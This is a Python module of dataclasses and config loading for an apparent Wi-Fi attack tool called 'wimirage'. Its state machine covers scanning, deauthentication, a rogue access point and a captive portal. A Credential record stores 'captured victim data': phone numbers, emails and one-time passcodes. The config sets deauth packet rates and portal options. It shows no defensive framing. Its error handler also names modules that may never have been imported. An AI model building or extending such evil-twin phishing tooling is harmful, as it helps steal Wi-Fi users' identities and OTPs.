"""Shared dataclasses and enums.

Exposes:
- :class:`AttackState` — state machine for the full chain
- :class:`AccessPoint` — discovered AP description
- :class:`Credential` — captured victim data
- :class:`AppConfig` — runtime configuration with on-disk loading
"""

import logging
import os
from dataclasses import asdict, dataclass, field, replace
from enum import Enum, auto
from typing import Any

logger = logging.getLogger("wimirage")

__all__ = [
    "AttackState",
    "AccessPoint",
    "Credential",
    "AppConfig",
]


class AttackState(Enum):
    """Finite-state machine for the orchestrated attack chain."""

    IDLE = auto()
    SCANNING = auto()
    SCANNED = auto()
    TARGET_SELECTED = auto()
    DEAUTH_RUNNING = auto()
    AP_RUNNING = auto()
    PORTAL_RUNNING = auto()
    FULL_ATTACK = auto()


@dataclass
class AccessPoint:
    """A Wi-Fi access point discovered by :class:`core.scanner.APScanner`."""

    ssid: str
    bssid: str
    channel: int
    signal: int | None = None
    encryption: str = "OPEN"
    clients: list[str] = field(default_factory=list)


@dataclass
class Credential:
    """One captured victim data record, written to the credential JSONL."""

    timestamp: str
    client_ip: str
    phone: str | None = None
    email: str | None = None
    otp: str | None = None
    stage: str = "unknown"


@dataclass
class AppConfig:
    """Runtime configuration. Load from disk via :meth:`load` (Section 2 #4).

    All defaults are compile-time. To load from YAML/TOML use::

        config = AppConfig.load("config/app.yml")
    """

    gateway: str = "10.0.0.1"
    dhcp_range: str = "10.0.0.2,10.0.0.100"
    portal_port: int = 80
    scan_timeout: int = 20
    deauth_pps: int = 100
    otp_length: int = 6
    otp_expiry_seconds: int = 300
    otp_max_attempts: int = 5
    otp_lockout_seconds: int = 600
    rate_limit_per_minute: int = 5
    secret_key: str = "change-me-in-production"
    log_file: str = ""
    encrypted_logs: bool = False
    encryption_key: bytes = b""

    # (Section 3) Where /success sends the victim after auth. "." is the
    # Flask-canonical "stay here" sentinel; never default to a third-party
    # host (privacy/XSS-history leak).
    success_redirect_url: str = "."

    # --- Configuration loading (Section 2 #4) ----------------------------

    @classmethod
    def load(cls, path: str | None = None) -> "AppConfig":
        """Construct an :class:`AppConfig` by overlaying a YAML/TOML file.

        Args:
            path: Path to config file. Honors ``$CONFIG_PATH`` if None.
                   Accepts ``.yml``/``.yaml``/``.toml``. Missing file → defaults.

        Returns:
            :class:`AppConfig` with fields overridden from the file.

        Example YAML::

            gateway: "192.168.50.1"
            deauth_pps: 200
            otp_length: 4
        """
        path = path or os.environ.get("CONFIG_PATH")
        if not path or not os.path.isfile(path):
            return cls()

        try:
            data: dict[str, Any]
            if path.endswith((".yml", ".yaml")):
                try:
                    import yaml  # type: ignore
                except ImportError:
                    logger.warning("PyYAML not installed; ignoring YAML config.")
                    return cls()
                with open(path, encoding="utf-8") as f:
                    data = yaml.safe_load(f) or {}
            elif path.endswith(".toml"):
                try:
                    import tomllib  # py3.11+
                except ImportError:  # pragma: no cover - 3.10 fallback
                    import tomli as tomllib  # type: ignore
                with open(path, "rb") as fb:
                    data = tomllib.load(fb) or {}
            else:
                logger.warning(f"Unknown config extension for {path}; using defaults.")
                return cls()

            valid = {f.name for f in cls.__dataclass_fields__.values()}  # type: ignore[attr-defined]
            filtered = {k: v for k, v in data.items() if k in valid}
            return replace(cls(), **filtered)
        except (
            yaml.YAMLError,
            tomllib.TOMLDecodeError,
            OSError,
            ValueError,
            TypeError,
            KeyError,
        ) as e:
            logger.error(
                f"Failed to load config from {path}: {type(e).__name__}: {e}; using defaults."
            )
            return cls()

    def to_dict(self) -> dict[str, Any]:
        """Return a JSON/YAML-serialisable snapshot of this config."""
        d = asdict(self)
        # bytes fields are not JSON-serialisable by default.
        d["encryption_key"] = self.encryption_key.hex() if self.encryption_key else ""
        return d
